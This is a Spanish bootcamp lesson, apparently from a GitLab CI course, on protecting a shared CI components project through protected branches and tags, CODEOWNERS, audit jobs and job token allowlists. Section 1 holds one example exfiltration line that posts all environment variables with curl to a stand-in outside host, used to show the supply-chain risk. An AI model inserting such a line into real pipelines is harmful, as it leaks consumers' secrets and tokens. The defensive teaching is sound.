# Gobernar el CI compartido

> Un componente se ejecuta **dentro** del pipeline de quien lo usa: con sus variables, sus secretos y su job token. Quien puede publicar en `ci/componentes` puede ejecutar código en todos los proyectos que lo consumen. Esta teoría trata `ci/componentes` como lo que es: el proyecto más sensible del grupo después de `infra`.

---

## 🎯 Objetivos

- Explicar por qué un cambio en un componente es un cambio en todos sus consumidores
- Proteger `ci/componentes` con las piezas de las Semanas 07 a 11: ramas, tags, dueños y auditoría
- Dar al job token de los consumidores el acceso mínimo a `ci/componentes`
- Saber qué ofrece Ultimate para imponer CI, y qué hace este bootcamp en su lugar

---

## 1. Qué problema resuelve

Hasta ahora, para cambiar lo que hace el pipeline de `app` había que fusionar en `app`, y `main` de `app` está protegida, con CODEOWNERS sobre `.gitlab-ci.yml` y `ci/`, y con `gobernanza` auditando cada merge request. Con `npm@1`, el job `build` de `app` lo decide `ci/componentes`. Una versión `1.4.0` que añade a `build` una línea como

```yaml
    - curl -s -d "$(env)" https://fuera.example
```

envía las variables de `app`, `GOBERNANZA_TOKEN` incluida, en el siguiente pipeline de `app`. Sin ningún commit en `app`. Todo lo que protegía el pipeline de `app` se puede rodear si `ci/componentes` está menos protegido.

---

## 2. Cómo funciona

### 2.1 El radio de un cambio

| Cambio | A quién llega | Cuándo |
|---|---|---|
| Commit en `main` de `ci/componentes` | A nadie | — |
| Tag `1.4.0` publicado | A cada consumidor con `@1` o `@1.4` | En su siguiente pipeline, sin merge request |
| Tag `2.0.0` publicado | A nadie con `@1` | Cuando cada consumidor cambie a `@2` en una merge request |

La protección de un consumidor frente a un *major* es su propia merge request. Frente a una *minor* o un *patch*, la única protección es la de `ci/componentes`.

### 2.2 Las cuatro capas

| Capa | De la semana | En `ci/componentes` |
|---|---|---|
| `main` protegida: nadie empuja, Maintainer fusiona | 07 | Ningún cambio llega sin merge request |
| Tags protegidos: solo Maintainer crea tags | 07 | Un Developer propone; publicar es otra decisión |
| CODEOWNERS | 07 | Cada componente con su dueño. En CE, GitLab no lo exige: lo lee `gobernanza` |
| `gobernanza` en cada merge request | 09 | El componente se audita a sí mismo: `ci/componentes` lo consume en su propio pipeline |

La última es la más elegante. `ci/componentes` incluye `gobernanza@$CI_COMMIT_SHA`, así que sus propias merge requests pasan por la auditoría que se está cambiando. Con un `GOBERNANZA_TOKEN` propio, como `app` en la Semana 09: un token de proyecto de `ci/componentes` con `read_api` y rol Reporter.

En CE, las aprobaciones obligatorias por CODEOWNERS son Premium. Aquí la regla de la Semana 07 sigue igual: el servidor no bloquea, `gobernanza` lo detecta y deja rastro.

### 2.3 El job token de los consumidores

`gobernanza` descarga su script de `ci/componentes` con el job token **del consumidor** (teoría 04, apartado 2.6). Si `ci/componentes` es privado, necesita una entrada en su lista de permitidos. Las opciones:

| Lista de permitidos de `ci/componentes` | Efecto |
|---|---|
| Vacía | La descarga falla con 403 en todos los consumidores |
| Cada consumidor, uno a uno | Exacto, pero cada proyecto nuevo es un cambio en `ci/componentes` |
| El grupo raíz | Cualquier proyecto del grupo puede leer `ci/componentes`; nadie de fuera |

El grupo raíz es lo razonable: los componentes son del grupo y ya son visibles para sus miembros. Lo que el job token puede hacer en `ci/componentes` es lo mismo que el usuario que lanzó el pipeline, acotado a los endpoints que admite el job token: leer su repositorio no le da permiso para empujar.

> [!NOTE]
> Si `ci/componentes` fuera **interno**, la descarga funcionaría sin lista de permitidos: probado en 19.2.4. Es otra razón para dejarlo privado: la lista de permitidos es explícita y se ve en `job_token_scope`; la visibilidad interna da acceso a cualquier proyecto de la instancia sin que figure en ningún sitio.

### 2.4 Retirar una versión

No se borra una versión publicada: los pipelines que ya la usaron la necesitan para entender qué pasó. Se publica la siguiente y se avisa:

1. La corrección como *patch*: `1.3.1`. Todos los `@1` la reciben en su siguiente pipeline.
2. Si la versión rota hizo daño (un secreto expuesto, un despliegue indebido), es un incidente: el inventario de `docs/secretos.md` dice qué rotar.
3. Un *major* que deja atrás `1.x` se anuncia en el README del proyecto y en la descripción de la release, con fecha de fin, y se mantiene `1.x` con *patches* hasta entonces. El bucle sobre `ci/lint` de la teoría 05 dice quién sigue en `@1`.

### 2.5 Lo que ofrece Ultimate

| Feature | Tier | Qué hace | En este bootcamp |
|---|---|---|---|
| *Pipeline execution policies* | Ultimate | Inyecta jobs en los pipelines de los proyectos elegidos, digan lo que digan sus YAML | No hay forma de imponer en CE: componentes + `gobernanza` + CODEOWNERS sobre `.gitlab-ci.yml` |
| *Compliance pipelines* | Ultimate | Lo mismo, con un marco de cumplimiento. Obsoleto desde 17.3, sustituido por la fila anterior | — |
| Aprobaciones obligatorias por CODEOWNERS | Premium | El servidor no deja fusionar sin el dueño | Auditoría con `gobernanza` (Semana 07) |

Comprobado el 14 de noviembre de 2026. Compensa pagar Ultimate cuando un regulador exige poder demostrar que **ningún** proyecto puede saltarse un escaneo: con componentes, un proyecto que no los incluye simplemente no los tiene. Lo que CE ofrece es que incluirlos sea más fácil que no hacerlo, y que quitarlos deje rastro en una merge request revisada.

---

## 3. Cómo se configura

La foto de la gobernanza de `ci/componentes`, en tres llamadas:

```bash
PC=$(printf '%s' "plataforma-<tu-dominio>/ci/componentes" | jq -sRr @uri)
curl -s -H "$H" "$API/projects/$PC/protected_branches" | jq -c '.[] | {name, push: [.push_access_levels[].access_level]}'
curl -s -H "$H" "$API/projects/$PC/protected_tags" | jq -c '.[] | {name, crear: [.create_access_levels[].access_level]}'
curl -s -H "$H" "$API/projects/$PC/job_token_scope/groups_allowlist" | jq -r '.[].web_url'
```

---

## 4. Antipatrones

| Antipatrón | Por qué duele | Qué hacer en su lugar |
|---|---|---|
| `ci/componentes` con menos protección que `app` | Es la puerta trasera del pipeline de `app` | Al menos la misma |
| Cualquiera del grupo puede crear tags | Un Developer publica una versión que llega a todos | Tags protegidos para Maintainer |
| `ci/componentes` interno "para no pelearse con el job token" | Cualquier proyecto de la instancia lee su repositorio | Privado y el grupo en la lista de permitidos |
| Un componente que lee secretos que no declara | El consumidor no sabe qué está entregando | Los secretos que use, documentados en el README y en `docs/secretos.md` del consumidor |
| Borrar un tag publicado | Los pipelines antiguos ya no se pueden reconstruir | Versión nueva |

---

## 5. Trucos

- **Qué cambió entre dos versiones antes de recibirlas**: `GET /projects/:id/repository/compare?from=1.2.0&to=1.3.0` en `ci/componentes`, solo con `templates/` y `scripts/`: es lo que va a ejecutar tu pipeline.
- **Ver los commits firmados de una versión**: el mismo `compare` trae los commits; `GET .../repository/commits/<sha>/signature` dice si cada uno está firmado (Semana 02).

---

## 📚 Recursos Adicionales

- [CI/CD component security best practices](https://docs.gitlab.com/ci/components/#cicd-component-security-best-practices)
- [Control job token access to your project](https://docs.gitlab.com/ci/jobs/ci_job_token/#control-job-token-access-to-your-project)
- [Pipeline execution policies](https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/) — Ultimate

---

## ✅ Checklist de Verificación

- [ ] Sabes qué cambios de `ci/componentes` llegan a `app` sin merge request en `app`
- [ ] Sabes qué protege cada una de las cuatro capas
- [ ] Sabes por qué el grupo en la lista de permitidos es mejor que un proyecto interno
- [ ] Sabes qué no puede hacer CE que sí hacen las *pipeline execution policies*

---

[← Anterior: Inputs de pipeline](07-inputs-de-pipeline.md) · [Volver a la Semana 12](../README.md)
